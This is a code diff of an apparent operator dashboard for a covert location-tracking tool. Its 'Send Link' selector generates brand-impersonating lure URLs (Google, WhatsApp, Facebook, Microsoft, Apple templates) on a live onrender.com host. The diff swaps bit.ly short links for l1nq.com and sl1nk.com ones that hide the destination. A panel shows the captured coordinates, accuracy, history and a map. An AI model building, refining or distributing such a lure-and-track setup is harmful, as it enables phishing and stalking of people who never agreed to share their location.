@@ -148,7 +148,6 @@
             #brandSelector .link-display { min-width: auto; }
         }
 
-        /* --- History moved to bottom --- */
         #historySection {
             position: relative;
             z-index: 1000;
@@ -211,7 +210,7 @@
     </div>
 </div>
 
-<!-- Brand Selector -->
+<!-- Brand Selector with your new short links -->
 <div id="brandSelector">
     <label for="brandSelect">🔗 Send Link:</label>
     <select id="brandSelect">
@@ -223,29 +222,23 @@
     </select>
     <span class="link-display" id="linkDisplay">https://location-tracker-cn7m.onrender.com/?template=whatsapp</span>
     <button class="copy-link" id="copyLinkBtn">📋 Copy Link</button>
-    <span class="short-link" id="shortLinkDisplay">bit.ly/4hOCDYS</span>
+    <span class="short-link" id="shortLinkDisplay">l1nq.com/k0glpen</span>
 </div>
 
-<!-- Info Panel -->
 <div id="infoPanel">
     <div class="item"><span class="label">📍 Coordinates:</span><span class="value" id="coordDisplay">--</span></div>
     <div class="item"><span class="label">🎯 Accuracy:</span><span class="value" id="accuracyDisplay">--</span></div>
     <div class="item"><span class="label">🕐 Last update:</span><span class="value" id="timeDisplay">--</span></div>
 </div>
 
-<!-- Map -->
 <div id="map"></div>
 
-<!-- Actions (buttons on map) -->
 <div id="actions">
     <a href="#" target="_blank" id="googleMapsLink" class="btn-google">📍 Open in Google Maps</a>
     <a href="#" target="_blank" id="appleMapsLink" class="btn-apple">📍 Open in Apple Maps</a>
     <button class="btn-clear" id="clearBtn">🗑️ Clear Data</button>
 </div>
 
-<!-- ========================================= -->
-<!-- HISTORY SECTION — MOVED TO BOTTOM        -->
-<!-- ========================================= -->
 <div id="historySection">
     <button class="history-toggle" id="historyToggle">📋 Show History</button>
     <div id="historyPanel">
@@ -255,22 +248,34 @@
 </div>
 
 <script>
+    // =============================================
+    // CONFIGURATION
+    // =============================================
     const RENDER_URL = '';
     const BASE_URL = 'https://location-tracker-cn7m.onrender.com';
 
+    // =============================================
+    // YOUR SHORT LINKS (l1nq.com / sl1nk.com)
+    // =============================================
     const SHORT_LINKS = {
-        google: 'bit.ly/4xnJHk8',
-        whatsapp: 'bit.ly/4hOCDYS',
-        facebook: 'bit.ly/4zKwlQD',
-        microsoft: 'bit.ly/3SzX3ur',
-        apple: 'bit.ly/4zv5tUq'
+        google: 'l1nq.com/b277ndk',
+        whatsapp: 'l1nq.com/k0glpen',
+        facebook: 'sl1nk.com/95glbl5',
+        microsoft: 'l1nq.com/dzj3125',
+        apple: 'l1nq.com/n82ifnp'
     };
 
+    // =============================================
+    // DOM Elements
+    // =============================================
     const brandSelect = document.getElementById('brandSelect');
     const linkDisplay = document.getElementById('linkDisplay');
     const shortLinkDisplay = document.getElementById('shortLinkDisplay');
     const copyLinkBtn = document.getElementById('copyLinkBtn');
 
+    // =============================================
+    // Update Link Display
+    // =============================================
     function updateLink() {
         const brand = brandSelect.value;
         const fullUrl = BASE_URL + '/?template=' + brand;
@@ -282,6 +287,9 @@
     brandSelect.addEventListener('change', updateLink);
     updateLink();
 
+    // =============================================
+    // Copy Link
+    // =============================================
     copyLinkBtn.addEventListener('click', function() {
         const link = linkDisplay.textContent;
         navigator.clipboard.writeText(link).then(() => {
@@ -291,6 +299,7 @@
                 copyLinkBtn.textContent = originalText;
             }, 2000);
         }).catch(() => {
+            // Fallback
             const range = document.createRange();
             range.selectNode(linkDisplay);
             window.getSelection().removeAllRanges();
@@ -304,6 +313,9 @@
         });
     });
 
+    // =============================================
+    // MAP & LOCATION
+    // =============================================
     const map = L.map('map').setView([51.505, -0.09], 13);
     L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
         attribution: '© OpenStreetMap contributors'
